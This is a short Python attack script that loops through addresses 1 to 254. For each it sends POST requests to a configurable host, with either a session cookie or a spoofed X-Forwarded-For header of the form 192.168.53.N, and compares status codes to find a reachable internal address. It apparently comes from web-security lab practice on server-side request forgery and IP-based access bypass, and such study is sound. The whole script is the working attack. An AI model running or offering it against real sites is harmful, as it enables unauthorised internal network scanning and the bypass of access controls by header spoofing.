import requests
import re

sessionValue=" "
host=" "
passlist=""
payloadParam1=" "
pValue1Begin=" "
pValue1End=" "

def scan_net(nr=1,supportXforward=False):
    cookie={'session':sessionValue}
    value=pValue1Begin+str(nr)+pValue1End
    payload = {payloadParam1:value}
    hed={'X-Forwarded-For':'192.168.53.'+str(nr)}
    try:
        if supportXforward:
            response = requests.post(host ,data=payload,headers=hed)
        else:
            response = requests.post(host ,data=payload,cookies=cookie)

    except Exception as e:
        print(e)
    res_status = response.status_code
    #or check     
    #res_status = response.history
    return res_status
 
 
def brute(supportXforward=False):
    bad_status=scan_net(1,supportXforward)
    for i in range(2,255):
        new_status=scan_net(i,supportXforward)
        print("TRY NR: "+str(i)+" =  "+str(new_status))
        if bad_status!=new_status:
            print("valid address can be: "+str(i))
            break

supportXforward=int(input("Do web support-X-forward[1/0]: "))

if supportXforward==1:
    supportXforward=True
else:
    supportXforward=False

brute(supportXforward)
